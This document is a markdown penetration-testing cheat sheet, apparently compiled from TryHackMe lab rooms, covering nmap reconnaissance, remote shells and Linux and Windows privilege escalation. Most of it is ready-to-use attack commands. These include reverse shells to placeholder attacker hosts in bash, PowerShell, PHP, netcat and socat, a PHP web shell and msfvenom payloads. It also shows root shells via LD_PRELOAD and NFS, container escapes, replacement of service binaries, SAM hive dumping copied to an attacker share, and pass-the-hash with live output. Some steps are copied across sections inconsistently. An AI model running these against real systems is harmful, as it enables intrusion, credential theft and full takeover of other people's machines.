# Reconnaissance

## Passive

## Active

### Host discovery

#### Host discovery via ARP Scan

Scan hosts in local subnet:

##### Use arp-scan

`arp-scan -l`

`arp-scan -l -I eth0`

##### Use nmap

`nmap -sn -PR <targets>`

#### Host discovery via ICMP scan

##### ICMP Ping scan (ICMP Type8/0):

`nmap -sn -PE <targets>`

##### ICMP Timestamp (ICMP Type 13/14):

`nmap -sn -PP <targets>`

##### ICMP Address Mask (ICMP Type 17/18):

`nmap -sn -PM <targets>`

#### Host discovery via TCP/UDP

##### TCP SYN ping (<ports> optional; port 80 by default):

`nmap -sn -PS<ports> <targets>`

##### TCP ACK ping (<ports> optional; port 80 by default, needs root priv):

`nmap -sn -PA<ports> <targets>`

##### UDP ping

`nmap -sn -PU <targets>`

##### masscan

To use masscan as host discovery we limit ports with `-p`:

`masscan -p<port> <targets>`

#### Host discovery via Reverse-DNS Lookup

Query DNS server even for offline hosts:

`nmap -sn -R <targets>`

### Port scan

#### TCP SYN scan

##### Regular scans

- Scan 100 most common ports in random order:

  `nmap -sS -F <target>`

- Scan 1000 most common ports in random order:

  `nmap -sS <target>`

- Scan all ports in random order:

  `nmap -sS -p- <target>`

- Scan 100 most common ports (-F) in paranoid mode (-T0):

  `namp -sS -F -T0 <target>`

##### Advanced scans

- Null Scan - no flags sent. No reply port open|filtered:

  `nmap -sN <target>`

- FIN Scan - FIN flag sent. No reply port open|filtered:

  `nmap -sF <target>`

- Xmas Scan - FIN, PSH, URG flags sent.  No reply port open|filtered:

  `nmap -sX <target>`

- ACK Scan - ACK flag send. RST on open|closed port. Will detect firewall rules, by marking open/closed ports as unfiltered:

  `nmap -sA <target>`

- Window Scan - like ACK scan, but window field is checked. Will detect firewall rules, by marking open/closed ports as closed:

  `nmap -sW <target>`

- Spoofed scan - sends a packet with a spoofed source IP address to the target machine and intercepts response by monitoring replies sent to spoofed IP

  `nmap -e <NET_INTERFACE> -Pn -S <SPOOFED_IP> <target>`

- Decoy scan - hides among spoofed IPs making it harder to detect orgin of portscan

  `nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.51.159`

- Idle/zombie scan - uses IP ID of zombie host while spoofing it's address to scan target. Zombie host must be 100% idle, like a network printer.

  `nmap -sI <ZOMBIE_IP> <target>`

#### UDP scan

Scan 100 most common ports in random order:

`nmap -sU -F <target>`

### Service/OS enumeration

#### Service detection

Full connect port scan with version detection. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9. 

`nmap -sV --version-light <target>`

#### OS detection

`nmap -sS -O <target>`

#### Custom scripts / vulnerability detection

All scripts (600+) are located in `/usr/share/nmap/scripts`.

- Use default scripts:

  `nmap -sS -sC <target>`

- Discovery scan - retrieve accessible information, such as database tables and DNS names:

  `nmap -sS --script discovery <target>`

- External scan - checks using a third-party service, such as Geoplugin and Virustotal (ie. dns-blacklists):

  `nmap -sS --script external <target>`

- Malware/backdor scan:

  `nmap -sS --script malware <target>`

- Vulnerability scan:

  `nmap -sS --script vuln <target>`

#### Output handling

- Normal - on screen, output:

  `nmap -sS -oN <target>`

- Gepable - one line for Up/Down, one line for ports report:

  `nmap -sS -oG <target>`

- XML - XML format:

  `nmap -sS -oX <target>`

- Script Kiddie special 31337 mode, just for laughs:
  
  `nmap -sS -oS <target>`

# Remote shell

## Bind shells

### Netcat bind shell

`nc -lvnp 1234 -e "cmd.exe"`

### Socat bind shell

- Linux target:

  `socat TCP-L:1234 EXEC:"bash -li"`

- Windows target:

  `socat TCP-L:1234 EXEC:"powershell.exe,pipes"`

  We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

- Attackbox connect command:

  `socat TCP:<TARGETIP>:1234 -`

## Reverse shells

### Bash reverse shell

The simplest method is to use bash, which is available on almost all Linux machines. This script was tested on Ubuntu 18.04, but not all versions of bash support this function:

`/bin/bash -i >& /dev/tcp/<ATTACKBOXIP>/9999 0>&1`

or

```
exec 5<>/dev/tcp/<ATTACKBOXIP>/9999
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Windows powershell

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### PHP reverse shell

If the target machine is a web server that supports PHP, this language will be an excellent choice for a reverse shell:

`php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

If this does not work, you can try replacing &3 with consecutive file descriptors.

### PHP web shell

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

### Netcat reverse shell

#### Setup listener:

`nc -lvnp 1234`

#### Option 1 with -e:

`nc <ATTACKBOXIP> 1234 -e /bin/bash`

#### Option 2 without -e:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKBOXIP> 1234 >/tmp/f`

### Socat reverse shell

#### Setup basic listener:

`socat TCP-L:1234 -`

#### Setup fully stable listener:

`socat TCP-L:1234 FILE:``tty``, raw,echo=0`

#### Windows target (for basic listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:powershell.exe,pipes`

#### Linux target (for basic listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:"bash -li"`

#### Linux target (for fully stable listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Socat encrypted shells

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

### Stablize remote shell

#### Use Python

To "stabilize your shell" for easier ability in typing commands, you can use the usual Python upgrade trick (assuming you are running in a bash shell):

- (on the reverse shell) `python3 -c "import pty; pty.spawn('/bin/bash')"`
- (on the reverse shell) `export TERM=xterm`
- (press `Ctrl+Z` on your keyboard)
- (on your local host) `stty raw -echo; fg`
- (press `Enter` on your keyboard)

You now have a stable shell, where you can safely use the left-and-right arrow keys to move around your input, up-and-down arrow keys to revisit command history, Tab for autocomplete and safely Ctrl+C to stop running programs!

#### Use rlwrap

1. Setup listener:
   This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
   
   `rlwrap nc -lvnp 1234`

2. Stabilize by using the same trick as in step three of the previous technique:

- (press `Ctrl+Z` on your keyboard)
- (on your local host) `stty raw -echo; fg`
- (press `Enter` on your keyboard)

## Shell payloads

### msfvenom

The standard syntax for msfvenom:

`msfvenom -p <PAYLOAD> <OPTIONS>`

#### Windows .exe

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ATTACKBOXIP> LPORT=1234`

### Staged vs stageless

- Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler.
- Stageless payloads entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

# Priv escalation

## Linux

### Enumeration

#### Manual enumeration

##### Check who you are

Instead of using `whoami` it makes sense to use `id` as it will provide uid, gid and group info in addition to your username:

`id`

##### Check hostname

Check hostname for clues about system role / naming convention used:

`hostname`

##### Check kernel

Check kernel info for clues against potential vulnerabilities that could lead to priv escalation:

`uname -a`

##### Check /proc entries

Check procfs entries for additional info about the system ie.:

- Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

`cat /proc/version`

- Looking at `/proc/cpuinfo` will give you information about system architecture, cpu cores, processors installed.

`cat /proc/cpuinfo`

##### Check /etc files

Most info about the system it's services and configuration may be found in `/etc`. Apart from service specific configuration files, which can hold a lot of interresting info, check basic ones:

- Password file will give out information about all users, their home directories and shells. This will help identify both service accounts, services installed as well as normal users.

`cat /etc/passwd`

- Check system MOTD / Issue - again to gain some recon about the system itself

```
cat /etc/issue
cat /etc/motd
```

##### Check running processes

`ps aux` or `ps -ef`

##### Check environment variables

`env`

##### Check all home directories

Check all home directories (and those outside of `/home` as well based on info from `/etc/passwd`), make sure you use `-a` to find hidden files/dirs:

`ls -a /home/*`

##### Check command history

Check command history. It can give out clues about services, other systems and accounts (ie. ssh) and sometimes secrets because of mistyping:

`history`

##### Check network info

- Check network interfaces:

`ifconfig -a`

- Check routes:

`route -n`

or

`ip route`

- Check all open ports:

`netstat -an`

- Check listening ports with pid and program name:

`netstat -ltp`

- Check interface statistics:

```
netstat -s
netstat -i
```

##### Search files

For simple searches, like flag files, try to use `locate` if available as it's quicker than `find`. However the latter gives you more flexibility and serch options and it's always present.

- Search for flags:

`find / -name flag*.txt 2>/dev/null`

- Search for 777 and 666 files:

```
find / -type f -perm 0777
find / -type f -perm 0666
```

- Search for recently modified files (ie. last 10 days):

`find / -mtime 10`

- Search for suid files:

`find / -perm -u=s -type f 2>/dev/null`

##### Check sudo

`sudo -l`

#### Automated enumeration

Couple of tools to use for automated enumeration:
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker 

### Kernel exploits

1. Based on your findings, you can use Google or Exploit-db to search for an existing exploit code.
2. Sources such as https://www.cvedetails.com/ can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

TODO: Dirty c0w

### Privlidged/SUDO applications

#### External file load

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).

Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file. 

#### Exploit LD_PRELOAD

1. When doing `sudo -l` look for `env_keep+=LD_PRELOAD`.

2. Write a simple C shell:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

3.  Compile as  a share object (.so extension) file:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

4. Run the program by specifying the LD_PRELOAD option:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

### SUID

1. Find SUID binaries:

`find / -type f -perm -04000 -ls 2>/dev/null`

2. Compare executables on this list with GTFOBins (https://gtfobins.github.io)

3. Exploit!

### Capabilities

1. Use the `getcap` tool to list enabled capabilities:

`getcap -r / 2>/dev/null`

2. Check GTFObins, as it has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

3. Exploit!

### Cron jobs

1. Check cron tables for possible root jobs executing scripts that can be modified:

```
cat /etc/contab
ls -l /etc/cron.*
```

2. Modify scripts ie. spin a reverse shell

### PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

### NFS shares

1. Search for mountable r/w shares with no_squash_root option (on TARGET):

`showmount -e`

2. Mount share (on ATTACKBOX):

`mkdir /tmp/mount; mount -o rw <target>:/path/to/share`

3. Create a simple C shell (on ATTACKBOX):

```
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

4. Compile and set SUID bit (on ATTACKBOX):

```
gcc shell.c -o shell
chmod u+s shell
```

5. Run SUID shell on TARGET!

### Privlidged container escape

#### Exploit privlidged capabilities


1. capsh --print
Check capabilities first

2.
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.

#### Exploiting docker socket

1. ls -la /var/run | grep sock
srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock

confirm you can run docker commands (be root in container or be in docker group as a lower-privileged user)
 
2. docker run -v /:/mnt --rm -it alpine chroot /mnt sh

#### Exposed Docker port 2375

1. curl http://10.10.85.243:2375/version

2. docker -H tcp://10.10.85.243:2375 ps

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further.

#### Namespace abuse

For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host, meaning that we can launch new commands such as a bash shell on the host. 

Use the following exploit: nsenter --target 1 --mount --uts --ipc --net /bin/bash

## Windows

### Check usual spots

#### Unattended Windows installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

#### Powershell history

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 

#### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

`cmdkey /list`

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

`runas /savecred /user:admin cmd.exe`

#### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

#### Retrieve creds from PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

#### Retrieve creds from other software

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

### Other quick wins

#### Scheduled Tasks

1. Check scheduled tasks:

`schtasks`

2. To retrieve detailed information about any of the services, you can use a command like the following one:

`schtasks /query /tn vulntask /fo list /v`

3. If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

`icacls c:\tasks\schtask.bat`

4. Launch reverse shell:

`echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`

5. Launch modified job:

`schtasks /run/ tn vulntask`

#### AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
        

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt

`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

### Abusing Service Misconfigurations

#### Windows Services weak permissions

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

1. Check services (ie. WindowsScheduler):

`sc qc WindowsScheduler`

2. Check permissions of runtime binary:

`icacls C:\PROGRA~2\SYSTEM~1\WService.exe`

3. If it can be modified then we can simply update the executable with a generated reverse shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKBOXIP>> LPORT=4445 -f exe-service -o rev-svc.exe`

4. Setup webserver on ATTACKBOX and download shell on <target>:

`python3 -m http.server`

5. Copy remote shell as WSservice.exe:

```
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

6. Restart service:

```
sc stop windowsscheduler
sc start windowsscheduler
```

#### Unquoted Service Paths

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

3. If it can be modified then we can simply update the executable with a generated reverse shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKBOXIP>> LPORT=4445 -f exe-service -o rev-svc.exe`

4. Setup webserver on ATTACKBOX and download shell on <target>:

`python3 -m http.server`

5. Copy remote shell as WSservice.exe:

```
cd C:\PROGRAC~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

6. Restart service:

```
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

#### Insecure Service Permissions

Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

3. If it can be modified then we can simply update the executable with a generated reverse shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKBOXIP>> LPORT=4445 -f exe-service -o rev-svc.exe`

4. Setup webserver on ATTACKBOX and download shell on <target>:

`python3 -m http.server`

5. Copy remote shell as WSservice.exe:

```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

6. Restart service:

```
sc stop <service>
sc start <service>
```

### Abusing dangerous privlieges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

`whoami /priv`

A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.

#### SeBackup / SeRestore

1. Start cmd as Administrator and check for privileges:

`whoami /priv`

2. Given SeBackup / SeRestore privileges are present, SAM and SYSTEM hashes can be backed up:

```
reg save hklm\system C:Users\THMBackup\system.hive
reg save hklm\sam C:Users\THMBackup\sam.hive
```

3. Start SMB server on ATTAKBOX:

`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`

4. Copy files to ATTACKBOX:

```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


        

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.167.136
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        


#### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. 

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```
        

We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman normal behaviour

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

To trigger utilman, we will lock our screen from the start button:

lock screen

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

utilman shell


#### SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:


There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:


Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.167.136/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

Webshell impersonate privileges

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

